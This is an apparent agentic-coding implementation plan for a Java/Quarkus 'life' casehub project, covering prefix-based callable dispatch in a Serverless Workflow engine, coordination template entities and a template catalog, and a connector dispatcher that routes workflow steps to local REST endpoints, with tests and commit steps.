# Playbook Coordination Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use
> subagent-driven-development (recommended) or executing-plans to
> implement this plan task-by-task. Each task follows TDD
> (test-driven-development) and uses ide-tooling for structural
> editing. Steps use checkbox (`- [ ]`) syntax for tracking.

**Focal issue:** #140 — feat: LLM-orchestrated mechanical coordination — playbook selection, pre/post-processing, case mapping
**Issue group:** #140

**Goal:** Shift mechanical connector work from LLM reasoning to deterministic Serverless Workflow execution, using a planning worker to select coordination templates at case start.

**Architecture:** Planning worker (AgentExec) runs pre-engine during extended case start, selects coordination templates from a catalog, writes a CoordinationPlan to context. `LifeCaseService.startCase()` builds a fresh CaseDefinition with FlowWorkerFunction workers wired from selected templates. ConnectorCallableDispatcher routes SWF `call: casehub:connector/*` steps to connector REST APIs.

**Tech Stack:** Java 21, Quarkus 3.32.2, CNCF Serverless Workflow SDK (via casehub-engine-support-core), FlowWorkerFunction, CallableDispatcher SPI

## Global Constraints

- No OpenClaw dependencies (PP-20261026-8a9dce) — use LifeAgentProviderFactory
- api/ module: zero framework imports, no JPA
- Flyway: life domain migrations at `db/life/migration/`, V114+ available
- `@Transactional` on service methods only, never resource methods
- All commits reference issue: `Refs #140`
- casehub-engine-support-core changes require `mvn install` in engine repo before life can consume them
- Test config: Flyway disabled (`migrate-at-start=false`), H2 `drop-and-create`
- `tenancyId` in tests: `"278776f9-e1b0-46fb-9032-8bddebdcf9ce"`

---

## Batch 1: Engine Prerequisites

Three backwards-compatible changes to `casehub-engine-support-core` (`io.casehub.engine.flow` package). All work happens in the casehub-engine repo. Install the SNAPSHOT locally after completing this batch.

### Task 1: CallableDispatchRegistry prefix matching + call name injection + public facade

**Files:**
- Modify: `engine/engine-support-core/src/main/java/io/casehub/engine/flow/CallableDispatchRegistry.java`
- Modify: `engine/engine-support-core/src/main/java/io/casehub/engine/flow/CasehubCallableTaskBuilder.java`
- Modify: `engine/engine-support-core/src/main/java/io/casehub/engine/flow/CasehubFlowContext.java`
- Create: `engine/engine-support-core/src/test/java/io/casehub/engine/flow/CallableDispatchRegistryPrefixTest.java`
- Modify: `engine/engine-support-core/src/test/java/io/casehub/engine/flow/CasehubCallableTaskBuilderTest.java`

**Interfaces:**
- Produces: `CallableDispatchRegistry.registerPrefix(String prefix, CallableDispatcher dispatcher)` — registers a prefix-based dispatcher
- Produces: `CasehubFlowContext.registerPrefix(String prefix, CallableDispatcher d)` — public facade for application-level registration
- Produces: `CasehubCallableTaskBuilder` injects `_callName` key into args map passed to `dispatch()`

- [ ] **Step 1: Write failing test for prefix dispatch**

```java
// CallableDispatchRegistryPrefixTest.java
package io.casehub.engine.flow;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.util.Map;
import java.util.concurrent.CompletableFuture;
import org.junit.jupiter.api.Test;

class CallableDispatchRegistryPrefixTest {

    @Test
    void prefix_dispatch_routes_matching_call_names() {
        var registry = new CallableDispatchRegistry();
        CallableDispatcher dispatcher = (id, args) ->
            CompletableFuture.completedFuture(Map.of("routed", true));
        registry.registerPrefix("casehub:connector/", dispatcher);

        CallableDispatcher resolved = registry.get("casehub:connector/contacts/searchContacts");
        assertThat(resolved).isSameAs(dispatcher);
    }

    @Test
    void exact_match_takes_precedence_over_prefix() {
        var registry = new CallableDispatchRegistry();
        CallableDispatcher exact = (id, args) ->
            CompletableFuture.completedFuture(Map.of("type", "exact"));
        CallableDispatcher prefix = (id, args) ->
            CompletableFuture.completedFuture(Map.of("type", "prefix"));

        registry.register("casehub:connector/contacts/searchContacts", exact);
        registry.registerPrefix("casehub:connector/", prefix);

        CallableDispatcher resolved = registry.get("casehub:connector/contacts/searchContacts");
        assertThat(resolved).isSameAs(exact);
    }

    @Test
    void unmatched_call_name_throws() {
        var registry = new CallableDispatchRegistry();
        registry.registerPrefix("casehub:connector/", (id, args) ->
            CompletableFuture.completedFuture(Map.of()));

        assertThatThrownBy(() -> registry.get("unknown:call"))
            .isInstanceOf(UnsupportedOperationException.class);
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl engine-support-core -Dtest=CallableDispatchRegistryPrefixTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false`
Expected: FAIL — `registerPrefix` method doesn't exist

- [ ] **Step 3: Implement prefix matching on CallableDispatchRegistry**

Add a `ConcurrentHashMap<String, CallableDispatcher> prefixDispatchers` field and `registerPrefix()` method. Update `get()` to fall back to prefix matching:

```java
// Add field
private final ConcurrentHashMap<String, CallableDispatcher> prefixDispatchers =
    new ConcurrentHashMap<>();

// Add method
public void registerPrefix(final String prefix, final CallableDispatcher dispatcher) {
    final CallableDispatcher existing = prefixDispatchers.putIfAbsent(prefix, dispatcher);
    if (existing != null) {
        throw new IllegalStateException("Prefix dispatcher already registered for: " + prefix);
    }
}

// Update get() — add prefix fallback after exact match miss
public CallableDispatcher get(final String callName) {
    final CallableDispatcher d = dispatchers.get(callName);
    if (d != null) {
        return d;
    }
    for (var entry : prefixDispatchers.entrySet()) {
        if (callName.startsWith(entry.getKey())) {
            return entry.getValue();
        }
    }
    throw new UnsupportedOperationException(
        "No dispatcher registered for call name: " + callName);
}
```

- [ ] **Step 4: Run prefix test to verify it passes**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl engine-support-core -Dtest=CallableDispatchRegistryPrefixTest --batch-mode`
Expected: PASS

- [ ] **Step 5: Run existing CallableDispatchRegistryTest to confirm no regression**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl engine-support-core -Dtest=CallableDispatchRegistryTest --batch-mode`
Expected: PASS — exact-match behaviour unchanged

- [ ] **Step 6: Update CasehubCallableTaskBuilder to inject _callName**

In `CasehubCallableTaskBuilder.init()`, inject the call name into the args map so dispatchers can read it:

```java
// Replace the existing init() method body
@Override
public io.serverlessworkflow.impl.executors.CallableTaskFactory init(
    final CallFunction task,
    final WorkflowDefinition definition,
    final WorkflowMutablePosition position) {
    final String callName = task.getCall();
    final Map<String, Object> baseArgs =
        task.getWith() != null ? task.getWith().getAdditionalProperties() : Map.of();
    final Map<String, Object> enrichedArgs = new java.util.HashMap<>(baseArgs);
    enrichedArgs.put("_callName", callName);
    return () ->
        (workflowContext, taskContext, input) -> {
            final String instanceId = workflowContext.instanceData().id();
            return CasehubFlowContext.callableRegistry()
                .get(callName)
                .dispatch(instanceId, enrichedArgs)
                .thenApply(
                    output -> workflowContext.definition().application().modelFactory().from(output));
        };
}
```

Add import: `import java.util.HashMap;`

- [ ] **Step 7: Update CasehubCallableTaskBuilderTest to verify _callName injection**

Add a test that verifies `_callName` is present in args:

```java
@Test
void call_name_is_injected_into_dispatch_args() {
    // Register a dispatcher that captures args
    var capturedArgs = new java.util.concurrent.atomic.AtomicReference<Map<String, Object>>();
    CasehubFlowContext.init(null, new CallableDispatchRegistry());
    CasehubFlowContext.callableRegistry().register("test:call", (id, args) -> {
        capturedArgs.set(args);
        return CompletableFuture.completedFuture(Map.of());
    });

    // Verify _callName is in the args map
    // (exact test structure depends on how CasehubCallableTaskBuilder is tested —
    //  add to existing test class pattern)
}
```

Note: if `CasehubFlowContext.callableRegistry()` is package-private, this test runs because it's in the same package.

- [ ] **Step 8: Add public registerPrefix() facade on CasehubFlowContext**

```java
// Add to CasehubFlowContext.java
public static void registerPrefix(final String prefix, final CallableDispatcher dispatcher) {
    callableRegistry().registerPrefix(prefix, dispatcher);
}
```

- [ ] **Step 9: Run all engine-support-core tests**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl engine-support-core --batch-mode`
Expected: ALL PASS

- [ ] **Step 10: Install engine SNAPSHOT locally**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn install -pl engine-support-core --batch-mode -DskipTests`

- [ ] **Step 11: Commit**

```bash
git add engine-support-core/src/
git commit -m "feat: add prefix dispatch + call name injection to CallableDispatchRegistry

CallableDispatchRegistry gains registerPrefix() for prefix-based dispatch.
CasehubCallableTaskBuilder injects _callName into dispatch args.
CasehubFlowContext gains public registerPrefix() facade.

All backwards-compatible — existing exact-match registrations unchanged.

Refs casehubio/life#140"
```

---

## Batch 2: Life Foundation Types

CoordinationPlan record in api/, CoordinationTemplate entity, Flyway migration, and CoordinationTemplateCatalog service. All work in casehub-life.

### Task 2: CoordinationPlan record + CoordinationTemplate entity + catalog

**Files:**
- Create: `api/src/main/java/io/casehub/life/api/coordination/CoordinationPlan.java`
- Create: `api/src/main/java/io/casehub/life/api/coordination/GeneratedTemplate.java`
- Create: `api/src/main/java/io/casehub/life/api/coordination/WorkerActivation.java`
- Create: `app/src/main/java/io/casehub/life/app/coordination/CoordinationPlanResult.java`
- Create: `app/src/main/java/io/casehub/life/app/coordination/CoordinationTemplate.java`
- Create: `app/src/main/java/io/casehub/life/app/coordination/CoordinationTemplateCatalog.java`
- Create: `app/src/main/resources/db/life/migration/V114__coordination_template.sql`
- Create: `app/src/test/java/io/casehub/life/app/coordination/CoordinationTemplateCatalogTest.java`
- Create: `app/src/test/java/io/casehub/life/app/coordination/CoordinationPlanResultTest.java`

**Interfaces:**
- Produces: `CoordinationPlan(String preTemplate, Map<String,Object> preParams, String postTemplate, Map<String,Object> postParams, List<GeneratedTemplate> generatedTemplates, WorkerActivation workerActivation)` — record in api/
- Produces: `GeneratedTemplate(String name, String templateYaml)` — record in api/
- Produces: `WorkerActivation(List<String> skipWorkers, Map<String,Map<String,Object>> workerParams)` — record in api/
- Produces: `CoordinationPlanResult(CoordinationPlan plan)` — response schema in app/
- Produces: `CoordinationTemplateCatalog.findByDomain(String domain)` → `List<CoordinationTemplate>`
- Produces: `CoordinationTemplateCatalog.findByName(String name)` → `Optional<CoordinationTemplate>`
- Produces: `CoordinationTemplateCatalog.resolveToWorkflow(String templateName)` → `Workflow`
- Produces: `CoordinationTemplateCatalog.parseTemplateYaml(String yaml)` → `Workflow` (static)

- [ ] **Step 1: Write CoordinationPlan record (api/)**

```java
package io.casehub.life.api.coordination;

import java.util.List;
import java.util.Map;

public record CoordinationPlan(
    String preTemplate,
    Map<String, Object> preParams,
    String postTemplate,
    Map<String, Object> postParams,
    List<GeneratedTemplate> generatedTemplates,
    WorkerActivation workerActivation) {}
```

```java
package io.casehub.life.api.coordination;

public record GeneratedTemplate(String name, String templateYaml) {}
```

```java
package io.casehub.life.api.coordination;

import java.util.List;
import java.util.Map;

public record WorkerActivation(
    List<String> skipWorkers,
    Map<String, Map<String, Object>> workerParams) {}
```

- [ ] **Step 2: Write CoordinationPlanResult response schema (app/)**

```java
package io.casehub.life.app.coordination;

import io.casehub.life.api.coordination.CoordinationPlan;

public record CoordinationPlanResult(CoordinationPlan plan) {}
```

- [ ] **Step 3: Write failing test for CoordinationPlanResult serialisation**

```java
package io.casehub.life.app.coordination;

import static org.assertj.core.api.Assertions.assertThat;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.casehub.life.api.coordination.CoordinationPlan;
import io.casehub.life.api.coordination.GeneratedTemplate;
import io.casehub.life.api.coordination.WorkerActivation;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class CoordinationPlanResultTest {

    private static final ObjectMapper MAPPER = new ObjectMapper();

    @Test
    void round_trips_through_json() throws Exception {
        var plan = new CoordinationPlan(
            "contractor-onboarding",
            Map.of("contractorName", "Acme"),
            "completion-report",
            Map.of("recipientEmail", "mark@example.com"),
            List.of(new GeneratedTemplate("site-assessment", "do:\n  - log: test")),
            new WorkerActivation(List.of("get-quotes"), Map.of()));

        var result = new CoordinationPlanResult(plan);
        String json = MAPPER.writeValueAsString(result);
        var deserialized = MAPPER.readValue(json, CoordinationPlanResult.class);

        assertThat(deserialized.plan().preTemplate()).isEqualTo("contractor-onboarding");
        assertThat(deserialized.plan().postTemplate()).isEqualTo("completion-report");
        assertThat(deserialized.plan().generatedTemplates()).hasSize(1);
        assertThat(deserialized.plan().workerActivation().skipWorkers()).containsExactly("get-quotes");
    }

    @Test
    void handles_null_templates() throws Exception {
        var plan = new CoordinationPlan(null, null, null, null, List.of(), null);
        var result = new CoordinationPlanResult(plan);
        String json = MAPPER.writeValueAsString(result);
        var deserialized = MAPPER.readValue(json, CoordinationPlanResult.class);

        assertThat(deserialized.plan().preTemplate()).isNull();
        assertThat(deserialized.plan().postTemplate()).isNull();
    }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn install -pl api --batch-mode && JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=CoordinationPlanResultTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false`
Expected: PASS (records auto-serialise with Jackson)

- [ ] **Step 5: Write CoordinationTemplate JPA entity**

```java
package io.casehub.life.app.coordination;

import jakarta.persistence.Column;
import jakarta.persistence.Entity;
import jakarta.persistence.Id;
import jakarta.persistence.Table;
import java.time.Instant;
import java.util.UUID;

@Entity
@Table(name = "coordination_template")
public class CoordinationTemplate {

    @Id
    private UUID id;

    @Column(nullable = false, unique = true)
    private String name;

    @Column(nullable = false)
    private String domain;

    @Column(name = "template_yaml", nullable = false, columnDefinition = "TEXT")
    private String templateYaml;

    @Column(columnDefinition = "TEXT")
    private String description;

    @Column(nullable = false)
    private boolean curated;

    @Column(name = "created_at", nullable = false)
    private Instant createdAt;

    @Column(name = "use_count", nullable = false)
    private int useCount;

    @Column(name = "tenancy_id", nullable = false)
    private String tenancyId;

    protected CoordinationTemplate() {}

    public CoordinationTemplate(String name, String domain, String templateYaml,
                                 String description, boolean curated, String tenancyId) {
        this.id = UUID.randomUUID();
        this.name = name;
        this.domain = domain;
        this.templateYaml = templateYaml;
        this.description = description;
        this.curated = curated;
        this.createdAt = Instant.now();
        this.useCount = 0;
        this.tenancyId = tenancyId;
    }

    public UUID getId() { return id; }
    public String getName() { return name; }
    public String getDomain() { return domain; }
    public String getTemplateYaml() { return templateYaml; }
    public String getDescription() { return description; }
    public boolean isCurated() { return curated; }
    public Instant getCreatedAt() { return createdAt; }
    public int getUseCount() { return useCount; }
    public String getTenancyId() { return tenancyId; }

    public void incrementUseCount() { this.useCount++; }
}
```

- [ ] **Step 6: Write Flyway migration V114**

```sql
-- V114__coordination_template.sql
CREATE TABLE coordination_template (
    id            UUID         NOT NULL PRIMARY KEY,
    name          VARCHAR(255) NOT NULL UNIQUE,
    domain        VARCHAR(255) NOT NULL,
    template_yaml TEXT         NOT NULL,
    description   TEXT,
    curated       BOOLEAN      NOT NULL DEFAULT FALSE,
    created_at    TIMESTAMP    NOT NULL,
    use_count     INT          NOT NULL DEFAULT 0,
    tenancy_id    VARCHAR(255) NOT NULL
);

CREATE INDEX idx_coordination_template_domain ON coordination_template(domain);
CREATE INDEX idx_coordination_template_name ON coordination_template(name);
```

- [ ] **Step 7: Write failing test for CoordinationTemplateCatalog**

```java
package io.casehub.life.app.coordination;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

class CoordinationTemplateCatalogTest {

    private CoordinationTemplateCatalog catalog;

    @BeforeEach
    void setUp() {
        catalog = new CoordinationTemplateCatalog();
        // Load classpath templates from test resources
        catalog.loadClasspathTemplates("life/templates/");
    }

    @Test
    void finds_classpath_template_by_name() {
        var result = catalog.findByName("contractor-onboarding");
        assertThat(result).isPresent();
        assertThat(result.get().getDomain()).isEqualTo("contractor-coordination");
        assertThat(result.get().isCurated()).isTrue();
    }

    @Test
    void finds_templates_by_domain() {
        var results = catalog.findByDomain("contractor-coordination");
        assertThat(results).isNotEmpty();
        assertThat(results).anyMatch(t -> t.getName().equals("contractor-onboarding"));
    }

    @Test
    void returns_empty_for_unknown_name() {
        assertThat(catalog.findByName("nonexistent")).isEmpty();
    }

    @Test
    void resolves_template_to_workflow() {
        var workflow = catalog.resolveToWorkflow("contractor-onboarding");
        assertThat(workflow).isNotNull();
    }

    @Test
    void throws_for_unknown_template_resolution() {
        assertThatThrownBy(() -> catalog.resolveToWorkflow("nonexistent"))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("Unknown template");
    }

    @Test
    void parse_template_yaml_produces_valid_workflow() {
        String yaml = """
            do:
              - call: casehub:connector/contacts/searchContacts
                with:
                  query: test
            """;
        var workflow = CoordinationTemplateCatalog.parseTemplateYaml(yaml);
        assertThat(workflow).isNotNull();
    }
}
```

- [ ] **Step 8: Run test to verify it fails**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=CoordinationTemplateCatalogTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: FAIL — class doesn't exist

- [ ] **Step 9: Implement CoordinationTemplateCatalog**

```java
package io.casehub.life.app.coordination;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;
import io.serverlessworkflow.api.WorkflowFormat;
import io.serverlessworkflow.api.WorkflowReader;
import io.serverlessworkflow.api.types.Workflow;
import jakarta.enterprise.context.ApplicationScoped;
import jakarta.inject.Inject;
import jakarta.persistence.EntityManager;
import jakarta.transaction.Transactional;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.ConcurrentHashMap;

@ApplicationScoped
public class CoordinationTemplateCatalog {

    private static final ObjectMapper JSON_MAPPER = new ObjectMapper();
    private static final ObjectMapper YAML_MAPPER = new ObjectMapper(new YAMLFactory());
    private final Map<String, CoordinationTemplate> classpathTemplates = new ConcurrentHashMap<>();

    @Inject
    EntityManager em;

    public void loadClasspathTemplates(String basePath) {
        // Load from classpath — each YAML file is a template
        // Template name derived from filename (without .yaml extension)
        // Domain and description read from YAML front matter
    }

    public List<CoordinationTemplate> findByDomain(String domain) {
        var results = new ArrayList<>(classpathTemplates.values().stream()
            .filter(t -> t.getDomain().equals(domain))
            .toList());
        if (em != null) {
            results.addAll(em.createQuery(
                "SELECT t FROM CoordinationTemplate t WHERE t.domain = :domain",
                CoordinationTemplate.class)
                .setParameter("domain", domain)
                .getResultList());
        }
        return results;
    }

    public Optional<CoordinationTemplate> findByName(String name) {
        var classpath = classpathTemplates.get(name);
        if (classpath != null) return Optional.of(classpath);
        if (em == null) return Optional.empty();
        return em.createQuery(
            "SELECT t FROM CoordinationTemplate t WHERE t.name = :name",
            CoordinationTemplate.class)
            .setParameter("name", name)
            .getResultStream().findFirst();
    }

    public List<CoordinationTemplate> all() {
        var results = new ArrayList<>(classpathTemplates.values());
        if (em != null) {
            results.addAll(em.createQuery(
                "SELECT t FROM CoordinationTemplate t WHERE t.curated = false",
                CoordinationTemplate.class)
                .getResultList());
        }
        return results;
    }

    @Transactional
    public void save(CoordinationTemplate template) {
        em.persist(template);
    }

    public Workflow resolveToWorkflow(String templateName) {
        CoordinationTemplate t = findByName(templateName)
            .orElseThrow(() -> new IllegalArgumentException(
                "Unknown template: " + templateName));
        return parseTemplateYaml(t.getTemplateYaml());
    }

    public static Workflow parseTemplateYaml(String templateYaml) {
        try {
            ObjectNode doc = JSON_MAPPER.createObjectNode();
            doc.putObject("document")
               .put("dsl", "1.0.0")
               .put("name", "template")
               .put("namespace", "life")
               .put("version", "1.0.0");
            var yamlTree = YAML_MAPPER.readTree(templateYaml);
            if (yamlTree.has("do")) {
                doc.set("do", yamlTree.get("do"));
            } else {
                doc.set("do", yamlTree);
            }
            return WorkflowReader.readWorkflowFromString(
                JSON_MAPPER.writeValueAsString(doc), WorkflowFormat.JSON);
        } catch (Exception e) {
            throw new IllegalArgumentException(
                "Failed to parse template YAML: " + e.getMessage(), e);
        }
    }
}
```

Note: `loadClasspathTemplates()` implementation reads YAML files from the classpath. Each file must contain a `meta:` section with `domain:` and `description:` fields, plus the `do:` block. See Batch 3 Task 4 for template format.

- [ ] **Step 10: Run test to verify it passes**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=CoordinationTemplateCatalogTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: PASS (some tests may need test-resource templates — create a minimal `src/test/resources/life/templates/contractor-onboarding.yaml` with a trivial `do:` block)

- [ ] **Step 11: Commit**

```bash
git add api/src/main/java/io/casehub/life/api/coordination/
git add app/src/main/java/io/casehub/life/app/coordination/
git add app/src/main/resources/db/life/migration/V114__coordination_template.sql
git add app/src/test/java/io/casehub/life/app/coordination/
git commit -m "feat(#140): add CoordinationPlan, CoordinationTemplate, and catalog

CoordinationPlan record (api/) for planning worker output.
CoordinationTemplate JPA entity with V114 migration.
CoordinationTemplateCatalog merges classpath + runtime templates.

Refs #140"
```

---

## Batch 3: Connector Dispatcher

ConnectorCallableDispatcher routes SWF `call: casehub:connector/*` steps to connector REST APIs. ConnectorDispatchRouter resolves domain/operation to REST paths.

### Task 3: ConnectorCallableDispatcher + ConnectorDispatchRouter

**Files:**
- Create: `app/src/main/java/io/casehub/life/app/coordination/ConnectorCallableDispatcher.java`
- Create: `app/src/main/java/io/casehub/life/app/coordination/ConnectorDispatchRouter.java`
- Create: `app/src/test/java/io/casehub/life/app/coordination/ConnectorCallableDispatcherTest.java`
- Create: `app/src/test/java/io/casehub/life/app/coordination/ConnectorDispatchRouterTest.java`

**Interfaces:**
- Consumes: `CallableDispatcher` (io.casehub.engine.flow) — SPI to implement
- Consumes: `CasehubFlowContext.registerPrefix()` — from Task 1
- Produces: `ConnectorCallableDispatcher` — registered at startup, routes `casehub:connector/*`
- Produces: `ConnectorDispatchRouter.invoke(String domain, String operation, Map<String,Object> params)` → `CompletableFuture<Map<String,Object>>`

- [ ] **Step 1: Write failing test for ConnectorDispatchRouter**

```java
package io.casehub.life.app.coordination;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import org.junit.jupiter.api.Test;

class ConnectorDispatchRouterTest {

    @Test
    void resolves_known_domain_to_base_path() {
        var router = new ConnectorDispatchRouter();
        String path = router.resolvePath("contacts", "searchContacts");
        assertThat(path).isEqualTo("/api/connectors/contacts/searchContacts");
    }

    @Test
    void resolves_health_domain() {
        var router = new ConnectorDispatchRouter();
        String path = router.resolvePath("health", "searchProviders");
        assertThat(path).isEqualTo("/api/connectors/health/searchProviders");
    }

    @Test
    void throws_for_unknown_domain() {
        var router = new ConnectorDispatchRouter();
        assertThatThrownBy(() -> router.resolvePath("unknown", "op"))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("Unknown connector domain: unknown");
    }

    @Test
    void lists_known_operations_for_domain() {
        var router = new ConnectorDispatchRouter();
        assertThat(router.knownDomains()).contains(
            "contacts", "calendar", "bank", "chat", "commerce",
            "documents", "email", "health", "location", "messaging",
            "project", "travel");
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=ConnectorDispatchRouterTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: FAIL — class doesn't exist

- [ ] **Step 3: Implement ConnectorDispatchRouter**

```java
package io.casehub.life.app.coordination;

import jakarta.enterprise.context.ApplicationScoped;
import jakarta.inject.Inject;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import com.fasterxml.jackson.databind.ObjectMapper;

@ApplicationScoped
public class ConnectorDispatchRouter {

    private static final ObjectMapper MAPPER = new ObjectMapper();
    private static final String BASE = "/api/connectors";

    private static final Set<String> KNOWN_DOMAINS = Set.of(
        "contacts", "calendar", "bank", "chat", "commerce",
        "documents", "email", "health", "location", "messaging",
        "project", "travel");

    @Inject
    io.vertx.mutiny.core.Vertx vertx;

    public String resolvePath(String domain, String operation) {
        if (!KNOWN_DOMAINS.contains(domain)) {
            throw new IllegalArgumentException("Unknown connector domain: " + domain);
        }
        return BASE + "/" + domain + "/" + operation;
    }

    public Set<String> knownDomains() {
        return KNOWN_DOMAINS;
    }

    @SuppressWarnings("unchecked")
    public CompletableFuture<Map<String, Object>> invoke(
            String domain, String operation, Map<String, Object> params) {
        String path = resolvePath(domain, operation);
        // Local HTTP call to the connector API running in the same Quarkus app
        // Uses Vert.x WebClient for non-blocking invocation
        return vertx.createHttpClient()
            .request(io.vertx.core.http.HttpMethod.POST,
                     8080, "localhost", path)
            .flatMap(req -> {
                try {
                    String body = MAPPER.writeValueAsString(params);
                    return req.putHeader("Content-Type", "application/json")
                              .send(io.vertx.mutiny.core.buffer.Buffer.buffer(body));
                } catch (Exception e) {
                    return io.smallrye.mutiny.Uni.createFrom().failure(e);
                }
            })
            .map(resp -> {
                try {
                    return MAPPER.readValue(resp.bodyAsString(), Map.class);
                } catch (Exception e) {
                    throw new RuntimeException("Failed to parse connector response", e);
                }
            })
            .subscribeAsCompletionStage()
            .toCompletableFuture();
    }
}
```

Note: The exact HTTP invocation mechanism will depend on how connector APIs are deployed. If connectors run in the same Quarkus app, this is a local HTTP call. If separate, the base URL comes from config. Adjust during implementation.

- [ ] **Step 4: Run router test to verify it passes**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=ConnectorDispatchRouterTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: PASS

- [ ] **Step 5: Write failing test for ConnectorCallableDispatcher**

```java
package io.casehub.life.app.coordination;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import org.junit.jupiter.api.Test;

class ConnectorCallableDispatcherTest {

    @Test
    void parses_call_name_and_routes_to_domain_operation() throws Exception {
        var capturedDomain = new String[1];
        var capturedOp = new String[1];

        ConnectorDispatchRouter mockRouter = new ConnectorDispatchRouter() {
            @Override
            public CompletableFuture<Map<String, Object>> invoke(
                    String domain, String operation, Map<String, Object> params) {
                capturedDomain[0] = domain;
                capturedOp[0] = operation;
                return CompletableFuture.completedFuture(Map.of("result", "ok"));
            }
        };

        var dispatcher = new ConnectorCallableDispatcher(mockRouter);
        Map<String, Object> args = new HashMap<>();
        args.put("_callName", "casehub:connector/contacts/searchContacts");
        args.put("query", "Acme Plumbing");

        var result = dispatcher.dispatch("wf-1", args).get();

        assertThat(capturedDomain[0]).isEqualTo("contacts");
        assertThat(capturedOp[0]).isEqualTo("searchContacts");
        assertThat(result).containsEntry("result", "ok");
    }

    @Test
    void strips_internal_keys_from_params() throws Exception {
        var capturedParams = new Map[1];

        ConnectorDispatchRouter mockRouter = new ConnectorDispatchRouter() {
            @Override
            public CompletableFuture<Map<String, Object>> invoke(
                    String domain, String operation, Map<String, Object> params) {
                capturedParams[0] = params;
                return CompletableFuture.completedFuture(Map.of());
            }
        };

        var dispatcher = new ConnectorCallableDispatcher(mockRouter);
        Map<String, Object> args = new HashMap<>();
        args.put("_callName", "casehub:connector/bank/listTransactions");
        args.put("accountId", "12345");

        dispatcher.dispatch("wf-1", args).get();

        assertThat(capturedParams[0]).doesNotContainKey("_callName");
        assertThat(capturedParams[0]).containsEntry("accountId", "12345");
    }
}
```

- [ ] **Step 6: Implement ConnectorCallableDispatcher**

```java
package io.casehub.life.app.coordination;

import io.casehub.engine.flow.CallableDispatcher;
import io.casehub.engine.flow.CasehubFlowContext;
import jakarta.enterprise.context.ApplicationScoped;
import jakarta.enterprise.event.Observes;
import jakarta.inject.Inject;
import io.quarkus.runtime.StartupEvent;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CompletableFuture;

@ApplicationScoped
public class ConnectorCallableDispatcher implements CallableDispatcher {

    private final ConnectorDispatchRouter router;

    @Inject
    public ConnectorCallableDispatcher(ConnectorDispatchRouter router) {
        this.router = router;
    }

    void onStartup(@Observes StartupEvent event) {
        CasehubFlowContext.registerPrefix("casehub:connector/", this);
    }

    @Override
    public CompletableFuture<Map<String, Object>> dispatch(
            String workflowInstanceId, Map<String, Object> args) {
        String callName = (String) args.get("_callName");
        if (callName == null) {
            return CompletableFuture.failedFuture(
                new IllegalArgumentException("Missing _callName in dispatch args"));
        }

        // casehub:connector/contacts/searchContacts → ["casehub:connector", "contacts", "searchContacts"]
        String withoutPrefix = callName.substring("casehub:connector/".length());
        int slash = withoutPrefix.indexOf('/');
        if (slash < 0) {
            return CompletableFuture.failedFuture(
                new IllegalArgumentException(
                    "Invalid call name format — expected casehub:connector/{domain}/{operation}, got: " + callName));
        }
        String domain = withoutPrefix.substring(0, slash);
        String operation = withoutPrefix.substring(slash + 1);

        Map<String, Object> params = new HashMap<>(args);
        params.remove("_callName");

        return router.invoke(domain, operation, params);
    }
}
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=ConnectorCallableDispatcherTest,ConnectorDispatchRouterTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: PASS

- [ ] **Step 8: Commit**

```bash
git add app/src/main/java/io/casehub/life/app/coordination/ConnectorCallableDispatcher.java
git add app/src/main/java/io/casehub/life/app/coordination/ConnectorDispatchRouter.java
git add app/src/test/java/io/casehub/life/app/coordination/
git commit -m "feat(#140): add ConnectorCallableDispatcher + ConnectorDispatchRouter

Routes SWF call: casehub:connector/{domain}/{operation} steps to
connector REST APIs. Registers at startup via CasehubFlowContext.registerPrefix().

Refs #140"
```

---

## Batch 4: Template Validation + Curated Templates

CoordinationTemplateValidator validates LLM-generated templates before they execute. 8 curated YAML template files provide the initial library.

